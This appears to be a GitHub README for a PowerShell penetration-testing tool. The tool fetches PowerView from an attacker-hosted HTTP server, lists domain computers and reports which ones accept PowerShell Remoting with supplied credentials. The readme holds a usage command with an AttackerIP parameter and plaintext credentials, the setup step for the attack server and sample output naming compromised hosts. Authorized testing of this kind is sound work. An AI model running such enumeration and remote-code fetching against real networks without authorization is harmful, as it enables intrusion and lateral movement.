# ADScripts
some scripts used in AD Pentesting
# PSRemoting Checker

A PowerShell script to identify domain computers accessible via PowerShell Remoting with provided credentials.

## Features

- Automatic download of required PowerView module
- Domain computer enumeration
- PSRemoting accessibility testing
- Clear success/failure reporting
- Summary of compromised machines
- Temporary file cleanup

## Prerequisites

- PowerShell 5.1+
- Network access to domain controller
- HTTP server hosting PowerView.ps1
- Valid domain credentials

## Usage

```powershell
.\PSRemotingChecker.ps1 -AttackerIP "10.10.16.2" -Username "domain\user" -Password "P@ssw0rd!"
```

## Parameters

| Parameter    | Description                              | Example Value                   |
|--------------|------------------------------------------|---------------------------------|
| AttackerIP   | IP hosting PowerView.ps1                 | `10.10.16.2`                    |
| Username     | Domain user in `DOMAIN\username` format  | `internal.zsm.local\melissa`    |
| Password     | Password for specified user              | `WinterIsHere2022!`             |

## Output Example

```text
[*] PowerShell Version: 5.1.20348.2849
[*] Downloading PowerView...
[+] PowerView saved to C:\Users\marcus\AppData\Local\Temp\PowerView.ps1
[*] Importing PowerView...
[+] PowerView imported.
[*] Enumerating domain computers...
[+] Found 23 computers.

=== ACCESSIBLE MACHINES ===

ComputerName   AccessAs
------------   --------
DC01           internal\melissa
FILE01         internal\melissa
SQL02          internal\melissa

Total accessible machines: 3
```

## Setup Instructions

1. Host PowerView.ps1 on your attack machine:
   ```bash
   python3 -m http.server 80
   ```
2. Clone repository:
   ```bash
   git clone https://github.com/yourusername/PSRemotingChecker.git
   ```
3. Run script with domain credentials

## Security Considerations

- Always use temporary credentials for testing
- Delete script after use in production environments
- Ensure proper authorization before running

## License

MIT License - See [LICENSE](LICENSE) for details
